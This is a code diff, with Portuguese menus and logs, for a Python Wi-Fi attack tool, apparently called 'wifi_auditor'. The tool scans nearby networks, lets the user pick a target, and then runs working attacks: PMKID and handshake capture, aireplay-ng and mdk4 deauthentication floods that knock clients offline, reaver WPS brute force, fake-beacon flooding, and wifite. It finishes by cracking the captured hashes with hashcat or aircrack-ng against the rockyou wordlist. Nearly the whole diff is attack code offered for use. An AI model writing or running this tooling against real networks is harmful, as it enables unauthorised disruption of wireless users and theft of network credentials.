@@ -113,23 +113,79 @@ def capture_vetor_x(monitor_interface, bssid, channel, output_file):
     pcapng = f"{output_file}_vetorX.pcapng"; hashf = f"{output_file}_vetorX.16800"
     run_command(f"rm -f {pcapng} {hashf}", sudo=True)
     run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
-    
-    # O Ataque mais moderno do mundo: Injeção ativa de Beacons e Probe Requests para forçar vazamento de Handshake/PMKID
-    # Ignora PMF e ataca o núcleo do protocolo 802.11
     cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --enable_status=31 --active_beacon --proberequest --wps"
-    
     supreme_log("Injetando Beacons Ativos e Probe Requests (Força Bruta de Camada 2)...")
     try:
         proc = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
         time.sleep(120); proc.terminate()
     except: pass
-    
     if os.path.exists(pcapng):
         run_command(f"hcxpcapngtool -o {hashf} {pcapng}")
         if os.path.exists(hashf) and os.path.getsize(hashf) > 0:
             supreme_log("VITÓRIA TÁTICA: O VETOR X EXTRAIU A CHAVE!")
             return hashf
     return None
+
+def capture_pmkid(monitor_interface, bssid, channel, output_file):
+    supreme_log("Iniciando Extração PMKID Stealth...", log_type="cmd")
+    pcapng = f"{output_file}_pmkid.pcapng"; hashf = f"{output_file}_pmkid.16800"
+    run_command(f"rm -f {pcapng} {hashf}", sudo=True)
+    run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
+    filtro = "alvo_filtro.txt"
+    with open(filtro, "w") as f: f.write(bssid.replace(":", "") + "\n")
+    cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --filterlist_ap={filtro} --filtermode=2 --enable_status=15"
+    try:
+        proc = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+        time.sleep(60); proc.terminate()
+    except: pass
+    os.remove(filtro)
+    if os.path.exists(pcapng):
+        run_command(f"hcxpcapngtool -o {hashf} {pcapng}")
+        if os.path.exists(hashf) and os.path.getsize(hashf) > 0: return hashf
+    return None
+
+def capture_handshake(monitor_interface, bssid, channel, output_file):
+    supreme_log("Iniciando Deauth Agressivo (MDK4)...", log_type="cmd")
+    os.system(f"rm -f {output_file}-01.*")
+    run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
+    dump_cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} --update 1 {monitor_interface}"
+    dump_proc = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    cap_file = f"{output_file}-01.cap"; handshake_found = False
+    for attempt in range(1, 4):
+        if attempt == 1: deauth_cmd = f"sudo aireplay-ng -0 10 -a {bssid} {monitor_interface}"
+        elif attempt == 2: deauth_cmd = f"sudo mdk4 {monitor_interface} d -B {bssid}"
+        else: deauth_cmd = f"sudo mdk4 {monitor_interface} a -a {bssid}"
+        deauth_proc = subprocess.Popen(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        for _ in range(40):
+            time.sleep(1)
+            if os.path.exists(cap_file) and os.path.getsize(cap_file) > 24:
+                stdout, _ = run_command(f"aircrack-ng -q {cap_file}")
+                if stdout and ("1 handshake" in stdout or "WPA (1 handshake)" in stdout): handshake_found = True; break
+        deauth_proc.terminate(); run_command("killall mdk4", sudo=True)
+        if handshake_found: break
+    dump_proc.terminate(); return cap_file if handshake_found else None
+
+def capture_wps(monitor_interface, bssid, channel):
+    cmd = f"sudo reaver -i {monitor_interface} -b {bssid} -c {channel} -K 1 -vv -f"
+    try:
+        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
+        return "WPS PIN" in res.stdout
+    except: return False
+
+def start_ghost_attack(interface, essid):
+    cmd = f"sudo mdk4 {interface} b -n \"{essid}\" -g -m"
+    try:
+        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(60); proc.terminate()
+    except: pass
+
+def start_wifite_expert(interface):
+    cmd = f"sudo wifite -i {interface} --kill --dict /usr/share/wordlists/rockyou.txt"
+    try: subprocess.run(cmd, shell=True)
+    except: pass
+
+def start_evil_twin(interface, essid):
+    supreme_log("Evil Twin requer configuração externa (Airgeddon recomendada).", log_type="info")
 
 def scan_networks(monitor_interface):
     boost_signal(monitor_interface)
@@ -151,24 +207,24 @@ def scan_networks(monitor_interface):
                         networks.append({'bssid': bssid, 'channel': row[3].strip(), 'privacy': row[5].strip(), 'essid': essid, 'vendor': identify_vendor(bssid)})
                 elif row[0].strip() == "Station MAC": break
     if not networks: return None
-    table = Table(title="SISTEMA DE RASTREAMENTO")
+    table = Table(title="RASTREAMENTO")
     table.add_column("ID"); table.add_column("Vendedor"); table.add_column("ESSID")
-    for i, net in enumerate(networks): table.add_row(str(i + 1), net['vendor'], net['essid'])
+    for i, net in enumerate(networks): table.add_row(str(i+1), net['vendor'], net['essid'])
     console.print(table)
     choice = IntPrompt.ask("Escolha", choices=[str(i+1) for i in range(len(networks))])
     target = networks[choice - 1]
     _, advice = analyze_vulnerabilities(target['vendor'], target['essid'], target['privacy'])
     supreme_log(f"DSI INTEL: {advice}")
-    console.print("[1] VETOR X (Mais Moderno/Eficaz)\n[2] WIFITE2 (Automático)\n[3] Deauth/MDK4\n[4] Evil Twin")
+    console.print("[1] VETOR X\n[2] WIFITE2\n[3] Handshake\n[4] Ghost")
     atk_c = Prompt.ask("Vetor", choices=["1","2","3","4"], default="1")
-    target['attack_type'] = {'1':'vetorx','2':'wifite','3':'handshake','4':'eviltwin'}[atk_c]
+    target['attack_type'] = {'1':'vetorx','2':'wifite','3':'handshake','4':'ghost'}[atk_c]
     return target
 
 def main():
     if os.geteuid() != 0: return
     while True:
         os.system("clear"); print_banner()
-        console.print("\n[1] Incursão HACKER ÚLTIMA GERAÇÃO\n[2] Wi-Fi 6 Fixer\n[3] Sair")
+        console.print("\n[1] Incursão HACKER SUPREMO\n[2] Wi-Fi 6 Doctor\n[3] Sair")
         opcao = Prompt.ask("Ação", choices=["1","2","3"])
         if opcao == '3': return
         elif opcao == '2': fix_drivers_wifi6(); continue
@@ -180,22 +236,20 @@ def main():
     try:
         target = scan_networks(mon)
         if not target: return
-        if target['attack_type'] == 'vetorx':
-            cap = capture_vetor_x(mon, target['bssid'], target['channel'], f"capture_{target['essid']}")
-        elif target['attack_type'] == 'wifite':
-            from wifi_auditor import start_wifite_expert; start_wifite_expert(mon); return
-        else: # Handshake / Evil Twin
-            from wifi_auditor import capture_handshake; cap = capture_handshake(mon, target['bssid'], target['channel'], f"capture_{target['essid']}")
+        prefix = f"capture_{target['essid']}"
+        if target['attack_type'] == 'vetorx': cap = capture_vetor_x(mon, target['bssid'], target['channel'], prefix)
+        elif target['attack_type'] == 'wifite': start_wifite_expert(mon); return
+        elif target['attack_type'] == 'ghost': start_ghost_attack(mon, target['essid']); return
+        else: cap = capture_handshake(mon, target['bssid'], target['channel'], prefix)
         if cap:
             wordlist = Prompt.ask("Wordlist", default="/usr/share/wordlists/rockyou.txt")
             crack_hash(cap, wordlist, target['bssid'])
-        else: supreme_log("Alvo resistiu a todos os protocolos modernos.", log_type="error")
     finally: set_managed_mode(mon)
 
 def crack_hash(hash_file, wordlist_file, bssid=None):
     if not os.path.exists(wordlist_file): return
-    crack_cmd = f"hashcat -m 16800 -a 0 {hash_file} {wordlist_file}" if hash_file.endswith(".16800") else f"aircrack-ng -w {wordlist_file} -b {bssid} {hash_file}"
-    try: subprocess.run(crack_cmd, shell=True)
+    cmd = f"hashcat -m 16800 -a 0 {hash_file} {wordlist_file}" if hash_file.endswith(".16800") else f"aircrack-ng -w {wordlist_file} -b {bssid} {hash_file}"
+    try: subprocess.run(cmd, shell=True)
     except: pass
 
 if __name__ == "__main__": main()
